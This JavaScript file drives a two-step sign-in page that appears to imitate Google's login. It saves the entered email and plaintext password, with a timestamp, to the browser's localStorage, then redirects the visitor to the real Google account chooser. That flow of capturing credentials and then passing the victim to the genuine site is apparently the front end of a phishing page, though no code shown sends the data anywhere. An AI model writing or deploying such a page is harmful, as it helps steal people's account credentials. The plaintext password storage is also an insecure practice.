document.addEventListener('DOMContentLoaded', () => {
    // Common functionality
    const languageSelect = document.querySelector('.language-select');
    if (languageSelect) {
        languageSelect.addEventListener('change', (e) => {
            console.log('Language changed to:', e.target.value);
        });
    }

    // Sign-in page functionality
    const signinForm = document.getElementById('signin-form');
    const emailInput = document.getElementById('email');
    
    if (signinForm) {
        signinForm.addEventListener('submit', (e) => {
            e.preventDefault();
            localStorage.setItem('userEmail', emailInput.value);
            window.location.href = 'password.html';
        });

        // Add keyboard navigation for email page
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && document.activeElement === emailInput) {
                if (signinForm.checkValidity()) {
                    signinForm.dispatchEvent(new Event('submit'));
                }
            }
        });
    }

    // Password page functionality
    const passwordForm = document.getElementById('password-form');
    const passwordInput = document.getElementById('password');
    const showPasswordCheckbox = document.getElementById('show-password-checkbox');
    const emailDisplay = document.getElementById('user-email');

    if (passwordForm) {
        // Display the email from localStorage
        const userEmail = localStorage.getItem('userEmail');
        if (userEmail) {
            emailDisplay.textContent = userEmail;
        } else {
            window.location.href = 'index.html';
        }

        // Add click to change email
        emailDisplay.addEventListener('click', () => {
            window.location.href = 'index.html';
        });

        // Toggle password visibility
        showPasswordCheckbox.addEventListener('change', (e) => {
            passwordInput.type = e.target.checked ? 'text' : 'password';
        });

        // Prevent password suggestions
        passwordInput.addEventListener('focus', function() {
            this.setAttribute('autocomplete', 'off');
            this.setAttribute('autofill', 'off');
        });

        // Function to handle login and redirection
        function handleLogin() {
            const password = passwordInput.value;
            if (password) {
                // Store credentials locally
                const credentials = {
                    email: userEmail,
                    password: password,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem('lastLoginAttempt', JSON.stringify(credentials));
                
                // Clear stored email
                localStorage.removeItem('userEmail');
                
                // Redirect to Gmail with email parameter
                window.location.replace(`https://accounts.google.com/AccountChooser?Email=${encodeURIComponent(userEmail)}`);
            } else {
                // Add error styling if password is empty
                passwordInput.style.borderColor = '#d93025';
            }
        }

        // Handle form submission
        passwordForm.addEventListener('submit', (e) => {
            e.preventDefault();
            handleLogin();
        });

        // Add keyboard navigation for password page
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && document.activeElement === passwordInput) {
                if (passwordForm.checkValidity()) {
                    handleLogin();
                }
            }
        });
    }
}); 